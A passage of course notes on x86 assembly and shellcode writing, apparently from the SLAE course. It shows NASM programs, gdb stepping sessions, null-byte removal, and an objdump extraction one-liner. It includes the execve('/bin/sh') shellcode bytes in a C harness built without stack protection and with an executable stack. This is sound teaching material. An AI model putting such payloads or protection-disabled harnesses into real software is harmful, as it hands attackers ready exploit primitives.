   0x080480bb <+59>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080480bd <+61>:	je     0x80480cb <SetEqual>
   0x080480bf <+63>:	mov    ecx,0x8049114
   0x080480c4 <+68>:	mov    edx,0x14
   0x080480c9 <+73>:	jmp    0x80480d5 <Print>
End of assembler dump.
(gdb) break *0x080480bd
Breakpoint 2 at 0x80480bd
(gdb) c
Continuing.
Hello World!

Breakpoint 2, 0x080480bd in _start ()
(gdb) print $eflags
$1 = [ PF ZF IF ]
(gdb) quit
A debugging session is active.

	Inferior 1 [process 16949] will be killed.

Quit anyway? (y or n) y

Libc and NASM:

* Define all functions you want to use with extern
* All arguments in reverse order on stack
 - CALL function(a,b,c,d)
 - push d, push c, push b, push a
* Adjust the stack after calling libc functions
* Link with GCC rather then LD - use 'main' instead of '_start'

vim Libc.nasm

; Filename: Libc.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

extern printf
extern exit

global main

section .text
main:

        push message
        call printf
        add esp, 0x4  ; adjust the stack

        mov eax, 0xa
        call exit



section .data

        message: db "Hello World!", 0xA, 0x00
        mlen     equ $-message

cat compile.sh 
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
gcc -o $1 $1.o

echo '[+] Done!'

./compile.sh Libc
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
./Libc 
Hello World!

gdb -q ./Libc
Reading symbols from /SLAE x86/Libc/Libc...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break main
Breakpoint 1 at 0x8048420
(gdb) run
Starting program: /SLAE x86/Libc/Libc 

Breakpoint 1, 0x08048420 in main ()
(gdb) disassemble 
Dump of assembler code for function main:
=> 0x08048420 <+0>:	push   0x804a018
   0x08048425 <+5>:	call   0x8048320 <printf@plt>
   0x0804842a <+10>:	add    esp,0x4
   0x0804842d <+13>:	mov    eax,0xa
   0x08048432 <+18>:	call   0x8048340 <exit@plt>
   0x08048437 <+23>:	nop
   0x08048438 <+24>:	nop
   0x08048439 <+25>:	nop
   0x0804843a <+26>:	nop
   0x0804843b <+27>:	nop
   0x0804843c <+28>:	nop
   0x0804843d <+29>:	nop
   0x0804843e <+30>:	nop
   0x0804843f <+31>:	nop
End of assembler dump.
(gdb) x/xw $esp
0xbffff68c:	0xb7e394e3
(gdb) stepi
0x08048425 in main ()
(gdb) x/xw $esp
0xbffff688:	0x0804a018
(gdb) x/s $esp
0xbffff688:	 "\030\240\004\b\343\224\343\267\001"
(gdb) x/s 0x0804a018 
0x804a018 <message>:	 "Hello World!\n"
(gdb) disassemble 
Dump of assembler code for function main:
   0x08048420 <+0>:	push   0x804a018
=> 0x08048425 <+5>:	call   0x8048320 <printf@plt>
   0x0804842a <+10>:	add    esp,0x4
   0x0804842d <+13>:	mov    eax,0xa
   0x08048432 <+18>:	call   0x8048340 <exit@plt>
   0x08048437 <+23>:	nop
   0x08048438 <+24>:	nop
   0x08048439 <+25>:	nop
   0x0804843a <+26>:	nop
   0x0804843b <+27>:	nop
   0x0804843c <+28>:	nop
   0x0804843d <+29>:	nop
   0x0804843e <+30>:	nop
   0x0804843f <+31>:	nop
End of assembler dump.
(gdb) x/xw $esp
0xbffff688:	0x0804a018
(gdb) stepi
0x08048320 in printf@plt ()     
(gdb) disassemble 
Dump of assembler code for function printf@plt:
=> 0x08048320 <+0>:	jmp    DWORD PTR ds:0x804a000
   0x08048326 <+6>:	push   0x0
   0x0804832b <+11>:	jmp    0x8048310
End of assembler dump.
(gdb) break *0x0804842a
Breakpoint 2 at 0x804842a
(gdb) c
Continuing.
Hello World!

Breakpoint 2, 0x0804842a in main ()
(gdb) disassemble 
Dump of assembler code for function main:
   0x08048420 <+0>:	push   0x804a018
   0x08048425 <+5>:	call   0x8048320 <printf@plt>
=> 0x0804842a <+10>:	add    esp,0x4
   0x0804842d <+13>:	mov    eax,0xa
   0x08048432 <+18>:	call   0x8048340 <exit@plt>
   0x08048437 <+23>:	nop
   0x08048438 <+24>:	nop
   0x08048439 <+25>:	nop
   0x0804843a <+26>:	nop
   0x0804843b <+27>:	nop
   0x0804843c <+28>:	nop
   0x0804843d <+29>:	nop
   0x0804843e <+30>:	nop
   0x0804843f <+31>:	nop
End of assembler dump.
(gdb) x/xw $esp
0xbffff688:	0x0804a018
(gdb) stepi
0x0804842d in main ()
(gdb) x/xw $esp
0xbffff68c:	0xb7e394e3
(gdb) c
Continuing.
[Inferior 1 (process 21437) exited with code 0343]
(gdb) quit

Shellcoding Basics:

vim shellcode.c

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
./shellcode 
Shellcode Length:  23
$ exit

gdb -q ./shellcode
Reading symbols from /SLAE x86/Shellcode/shellcode...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break main 
Breakpoint 1 at 0x80483e8
(gdb) run
Starting program: /SLAE x86/Shellcode/shellcode 

Breakpoint 1, 0x080483e8 in main ()
(gdb) disassemble 
Dump of assembler code for function main:
   0x080483e4 <+0>:	push   ebp
   0x080483e5 <+1>:	mov    ebp,esp
   0x080483e7 <+3>:	push   edi
=> 0x080483e8 <+4>:	and    esp,0xfffffff0
   0x080483eb <+7>:	sub    esp,0x30
   0x080483ee <+10>:	mov    eax,0x804a014
   0x080483f3 <+15>:	mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080483fb <+23>:	mov    edx,eax
   0x080483fd <+25>:	mov    eax,0x0
   0x08048402 <+30>:	mov    ecx,DWORD PTR [esp+0x1c]
   0x08048406 <+34>:	mov    edi,edx
   0x08048408 <+36>:	repnz scas al,BYTE PTR es:[edi]
   0x0804840a <+38>:	mov    eax,ecx
   0x0804840c <+40>:	not    eax
   0x0804840e <+42>:	lea    edx,[eax-0x1]
   0x08048411 <+45>:	mov    eax,0x8048510
   0x08048416 <+50>:	mov    DWORD PTR [esp+0x4],edx
   0x0804841a <+54>:	mov    DWORD PTR [esp],eax
   0x0804841d <+57>:	call   0x8048300 <printf@plt>
   0x08048422 <+62>:	mov    DWORD PTR [esp+0x2c],0x804a014
   0x0804842a <+70>:	mov    eax,DWORD PTR [esp+0x2c]
   0x0804842e <+74>:	call   eax
   0x08048430 <+76>:	mov    edi,DWORD PTR [ebp-0x4]
   0x08048433 <+79>:	leave  
   0x08048434 <+80>:	ret    
End of assembler dump.
(gdb) print /x &code
$1 = 0x804a014
(gdb) x/xw 0x804a014
0x804a014 <code>:	0x6850c031
(gdb) x/23xb 0x804a014
0x804a014 <code>:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68
0x804a01c <code+8>:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50
0x804a024 <code+16>:	0x53	0x89	0xe1	0xb0	0x0b	0xcd	0x80
(gdb) break *0x0804842e
Breakpoint 2 at 0x804842e
(gdb) c
Continuing.
Shellcode Length:  23

Breakpoint 2, 0x0804842e in main ()
(gdb) disassemble 
Dump of assembler code for function main:
   0x080483e4 <+0>:	push   ebp
   0x080483e5 <+1>:	mov    ebp,esp
   0x080483e7 <+3>:	push   edi
   0x080483e8 <+4>:	and    esp,0xfffffff0
   0x080483eb <+7>:	sub    esp,0x30
   0x080483ee <+10>:	mov    eax,0x804a014
   0x080483f3 <+15>:	mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080483fb <+23>:	mov    edx,eax
   0x080483fd <+25>:	mov    eax,0x0
   0x08048402 <+30>:	mov    ecx,DWORD PTR [esp+0x1c]
   0x08048406 <+34>:	mov    edi,edx
   0x08048408 <+36>:	repnz scas al,BYTE PTR es:[edi]
   0x0804840a <+38>:	mov    eax,ecx
   0x0804840c <+40>:	not    eax
   0x0804840e <+42>:	lea    edx,[eax-0x1]
   0x08048411 <+45>:	mov    eax,0x8048510
   0x08048416 <+50>:	mov    DWORD PTR [esp+0x4],edx
   0x0804841a <+54>:	mov    DWORD PTR [esp],eax
   0x0804841d <+57>:	call   0x8048300 <printf@plt>
   0x08048422 <+62>:	mov    DWORD PTR [esp+0x2c],0x804a014
   0x0804842a <+70>:	mov    eax,DWORD PTR [esp+0x2c]
=> 0x0804842e <+74>:	call   eax
   0x08048430 <+76>:	mov    edi,DWORD PTR [ebp-0x4]
   0x08048433 <+79>:	leave  
   0x08048434 <+80>:	ret    
End of assembler dump.
(gdb) print /x $eax
$2 = 0x804a014
(gdb) x/23xb 0x804a014
0x804a014 <code>:	0x31	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68
0x804a01c <code+8>:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50
0x804a024 <code+16>:	0x53	0x89	0xe1	0xb0	0x0b	0xcd	0x80
(gdb) break *0x0804a014
Breakpoint 3 at 0x804a014
(gdb) c
Continuing.

Breakpoint 3, 0x0804a014 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0804a014 <+0>:	xor    eax,eax
   0x0804a016 <+2>:	push   eax
   0x0804a017 <+3>:	push   0x68732f2f
   0x0804a01c <+8>:	push   0x6e69622f
   0x0804a021 <+13>:	mov    ebx,esp
   0x0804a023 <+15>:	push   eax
   0x0804a024 <+16>:	push   ebx
   0x0804a025 <+17>:	mov    ecx,esp
   0x0804a027 <+19>:	mov    al,0xb
   0x0804a029 <+21>:	int    0x80
   0x0804a02b <+23>:	add    BYTE PTR [eax],al
End of assembler dump.
(gdb) quit
A debugging session is active.

	Inferior 1 [process 22405] will be killed.

Quit anyway? (y or n) y

Exit Shellcode:

; Filename: exit.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        mov eax, 1
        mov ebx, 10
        int 0x80

./compile.sh exit
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!

cp exit.nasm exit-no-null.nasm (Remove nullbytes from code)

vim exit-no-null.nasm

; Filename: exit.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        xor eax, eax
        mov al, 1
        xor ebx, ebx
        int 0x80
	
./compile.sh exit-no-null
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
objdump -d exit-no-null -M intel

exit-no-null:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	b0 01                	mov    al,0x1
 8048064:	31 db                	xor    ebx,ebx
 8048066:	cd 80                	int    0x80
 
 https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump
 
 objdump -d ./exit-no-null|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\xb0\x01\x31\xdb\xcd\x80"

vim shellcode.c

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
./shellcode 
Shellcode Length:  10

echo $?
10

vim exit.nasm

; Filename: exit.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        mov eax, 1
        mov ebx, 10
        int 0x80

./compile.sh exit-no-null
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
objdump -d ./exit-no-null|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\xb0\x01\x31\xdb\xcd\x80"

HelloWorld Shellcode using JMP-CALL-POP:

vim HelloWorld Shellcode.nasm

; HelloWorldShellcode.asm
; Author: Vivek Ramachandran



global _start

section .text

_start:

        jmp short call_shellcode


shellcode:

        ; print hello world on the screen

        xor eax, eax
        mov al, 0x4

        xor ebx, ebx
        mov bl, 0x1

        pop ecx

        xor edx, edx
        mov dl, 13

        int 0x80


        ; exit the program gracefully

        xor eax, eax
        mov al, 0x1

        xor ebx, ebx

        int 0x80

call_shellcode:

        call shellcode
        message: db "Hello World!", 0xA
	
./compile.sh HelloWorldShellcode
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
./HelloWorldShellcode
Hello World!

objdump -d ./HelloWorldShellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a"

objdump -d HelloWorldShellcode -M intel

HelloWorldShellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 17                	jmp    8048079 <call_shellcode>

08048062 <shellcode>:
 8048062:	31 c0                	xor    eax,eax
 8048064:	b0 04                	mov    al,0x4
 8048066:	31 db                	xor    ebx,ebx
 8048068:	b3 01                	mov    bl,0x1
 804806a:	59                   	pop    ecx
 804806b:	31 d2                	xor    edx,edx
 804806d:	b2 0d                	mov    dl,0xd
 804806f:	cd 80                	int    0x80
 8048071:	31 c0                	xor    eax,eax
 8048073:	b0 01                	mov    al,0x1
 8048075:	31 db                	xor    ebx,ebx
 8048077:	cd 80                	int    0x80

08048079 <call_shellcode>:
 8048079:	e8 e4 ff ff ff       	call   8048062 <shellcode>

0804807e <message>:
 804807e:	48                   	dec    eax
 804807f:	65                   	gs
 8048080:	6c                   	ins    BYTE PTR es:[edi],dx
 8048081:	6c                   	ins    BYTE PTR es:[edi],dx
 8048082:	6f                   	outs   dx,DWORD PTR ds:[esi]
 8048083:	20 57 6f             	and    BYTE PTR [edi+0x6f],dl
 8048086:	72 6c                	jb     80480f4 <message+0x76>
 8048088:	64 21 0a             	and    DWORD PTR fs:[edx],ecx

vim shellcode.c

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x68\x72\x6c\x64\x0a\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

gcc -fno-stack-protector -zexecstack shellcode.c -o shellcode
./shellcode 
Shellcode Length:  40
Hello World

HelloWorld Shellcode using Stack:

vim HelloWorldShellcode-Stack.nasm

; HelloWorldShellcode.asm
; Author: Vivek Ramachandran



global _start

section .text

_start:

        xor eax, eax
        mov al, 0x4

        xor ebx, ebx
        mov bl, 0x1

        xor edx, edx
        push edx

        push 0x0a646c72
        push 0x6f57206f
        push 0x6c6c6548

        mov ecx, esp

        mov dl, 12

        int 0x80



        xor eax, eax
        mov al, 0x1

        xor ebx, ebx

        int 0x80
	
./compile.sh HelloWorldShellcode-Stack
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
./HelloWorldShellcode-Stack 
Hello World

objdump -d HelloWorldShellcode-Stack -M intel

HelloWorldShellcode-Stack:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	b0 04                	mov    al,0x4
 8048064:	31 db                	xor    ebx,ebx
 8048066:	b3 01                	mov    bl,0x1
 8048068:	31 d2                	xor    edx,edx
 804806a:	52                   	push   edx
 804806b:	68 72 6c 64 0a       	push   0xa646c72
 8048070:	68 6f 20 57 6f       	push   0x6f57206f
 8048075:	68 48 65 6c 6c       	push   0x6c6c6548
 804807a:	89 e1                	mov    ecx,esp
 804807c:	b2 0c                	mov    dl,0xc
 804807e:	cd 80                	int    0x80
 8048080:	31 c0                	xor    eax,eax
 8048082:	b0 01                	mov    al,0x1
 8048084:	31 db                	xor    ebx,ebx
 8048086:	cd 80                	int    0x80

objdump -d ./HelloWorldShellcode-Stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x68\x72\x6c\x64\x0a\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80"

vim shellcode.c

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x68\x72\x6c\x64\x0a\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
./shellcode 
Shellcode Length:  40
Hello World

gdb -q ./shellcode
Reading symbols from /SLAE x86/Shellcode/HelloWorld/shellcode...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break main 
Breakpoint 1 at 0x80483e8
(gdb) print /x &code
$1 = 0x804a040
(gdb) break *0x804a040
Breakpoint 2 at 0x804a040
(gdb) run
Starting program: /SLAE x86/Shellcode/HelloWorld/shellcode 

Breakpoint 1, 0x080483e8 in main ()
(gdb) c
Continuing.
Shellcode Length:  40

Breakpoint 2, 0x0804a040 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
   0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
(gdb) x/20cb $esp
0xbffff60c:	48 '0'	-124 '\204'	4 '\004'	8 '\b'	16 '\020'	-123 '\205'	4 '\004'8 '\b'
0xbffff614:	40 '('	0 '\000'	0 '\000'	0 '\000'	-12 '\364'	-97 '\237'	4 '\004'	8 '\b'
0xbffff61c:	97 'a'	-124 '\204'	4 '\004'	8 '\b'
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>disassemble 
>x/20cb $esp
>end
(gdb) stepi
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
=> 0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
   0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff60c:	48 '0'	-124 '\204'	4 '\004'	8 '\b'	16 '\020'	-123 '\205'	4 '\004'8 '\b'
0xbffff614:	40 '('	0 '\000'	0 '\000'	0 '\000'	-12 '\364'	-97 '\237'	4 '\004'	8 '\b'
0xbffff61c:	97 'a'	-124 '\204'	4 '\004'	8 '\b'
0x0804a042 in code ()
(gdb) 
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
=> 0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
   0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff60c:	48 '0'	-124 '\204'	4 '\004'	8 '\b'	16 '\020'	-123 '\205'	4 '\004'8 '\b'
0xbffff614:	40 '('	0 '\000'	0 '\000'	0 '\000'	-12 '\364'	-97 '\237'	4 '\004'	8 '\b'
0xbffff61c:	97 'a'	-124 '\204'	4 '\004'	8 '\b'
0x0804a044 in code ()
(gdb) 
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
=> 0x0804a046 <+6>:	mov    bl,0x1
   0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff60c:	48 '0'	-124 '\204'	4 '\004'	8 '\b'	16 '\020'	-123 '\205'	4 '\004'8 '\b'
0xbffff614:	40 '('	0 '\000'	0 '\000'	0 '\000'	-12 '\364'	-97 '\237'	4 '\004'	8 '\b'
0xbffff61c:	97 'a'	-124 '\204'	4 '\004'	8 '\b'
0x0804a046 in code ()
(gdb) 
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
=> 0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff60c:	48 '0'	-124 '\204'	4 '\004'	8 '\b'	16 '\020'	-123 '\205'	4 '\004'8 '\b'
0xbffff614:	40 '('	0 '\000'	0 '\000'	0 '\000'	-12 '\364'	-97 '\237'	4 '\004'	8 '\b'
0xbffff61c:	97 'a'	-124 '\204'	4 '\004'	8 '\b'
0x0804a048 in code ()
(gdb) 
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
   0x0804a048 <+8>:	xor    edx,edx
=> 0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff60c:	48 '0'	-124 '\204'	4 '\004'	8 '\b'	16 '\020'	-123 '\205'	4 '\004'8 '\b'
0xbffff614:	40 '('	0 '\000'	0 '\000'	0 '\000'	-12 '\364'	-97 '\237'	4 '\004'	8 '\b'
0xbffff61c:	97 'a'	-124 '\204'	4 '\004'	8 '\b'
0x0804a04a in code ()
(gdb) 
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
   0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
=> 0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff608:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	48 '0'	-124 '\204'	4 '\004'	8 '\b'
0xbffff610:	16 '\020'	-123 '\205'	4 '\004'	8 '\b'	40 '('	0 '\000'	0 '\000'0 '\000'
0xbffff618:	-12 '\364'	-97 '\237'	4 '\004'	8 '\b'
0x0804a04b in code ()
(gdb) 
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
   0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
=> 0x0804a050 <+16>:	push   0x6f57206f
   0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff604:	114 'r'	108 'l'	100 'd'	10 '\n'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0xbffff60c:	48 '0'	-124 '\204'	4 '\004'	8 '\b'	16 '\020'	-123 '\205'	4 '\004'8 '\b'
0xbffff614:	40 '('	0 '\000'	0 '\000'	0 '\000'
0x0804a050 in code ()
(gdb) 
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
   0x0804a048 <+8>:	xor    edx,edx
   0x0804a04a <+10>:	push   edx
   0x0804a04b <+11>:	push   0xa646c72
   0x0804a050 <+16>:	push   0x6f57206f
=> 0x0804a055 <+21>:	push   0x6c6c6548
   0x0804a05a <+26>:	mov    ecx,esp
   0x0804a05c <+28>:	mov    dl,0xc
   0x0804a05e <+30>:	int    0x80
   0x0804a060 <+32>:	xor    eax,eax
   0x0804a062 <+34>:	mov    al,0x1
   0x0804a064 <+36>:	xor    ebx,ebx
   0x0804a066 <+38>:	int    0x80
   0x0804a068 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0xbffff600:	111 'o'	32 ' '	87 'W'	111 'o'	114 'r'	108 'l'	100 'd'	10 '\n'
0xbffff608:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	48 '0'	-124 '\204'	4 '\004'	8 '\b'
0xbffff610:	16 '\020'	-123 '\205'	4 '\004'	8 '\b'
0x0804a055 in code ()
(gdb) 
Dump of assembler code for function code:
   0x0804a040 <+0>:	xor    eax,eax
   0x0804a042 <+2>:	mov    al,0x4
   0x0804a044 <+4>:	xor    ebx,ebx
   0x0804a046 <+6>:	mov    bl,0x1
